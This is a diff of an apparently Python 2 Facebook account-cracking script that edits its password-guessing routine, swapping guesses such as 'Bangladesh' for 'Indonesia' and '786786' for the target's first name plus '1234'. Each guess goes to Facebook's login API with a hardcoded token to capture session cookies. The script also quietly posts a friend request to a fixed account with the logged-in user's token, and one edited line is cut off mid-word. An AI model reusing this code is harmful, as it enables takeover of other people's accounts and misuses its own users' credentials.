@@ -188,7 +188,7 @@ def login():
 				zedd.close()
 				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://github.com/CrazyLolz100')
+				os.system('xdg-open https://github.com/Ajgtajopit')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;91m[!] No connection"
@@ -296,8 +296,8 @@ def pilih():
 		os.remove('out')
 	elif zedd =="8":
 		os.system('rm -rf login.txt')
-		os.system('xdg-open https://github.com/apaansihasw779')
-		keluar()
+		os.system('xdg-open https://github.com/Ajgtajopit')
+		kel
 	elif zedd =="0":
 		keluar()
 	else:
@@ -1126,7 +1126,7 @@ def mini():
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 												menu_hack()
 											else:
-												pz6 = "Bangladesh"
+												pz6 = "Indonesia"
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												y = json.load(data)
 												if 'access_token' in y:
@@ -1146,7 +1146,7 @@ def mini():
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
-														pz7 = "786786"
+														pz7 = a['first_name'] + '1234'
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 														y = json.load(data)
 														if 'access_token' in y:
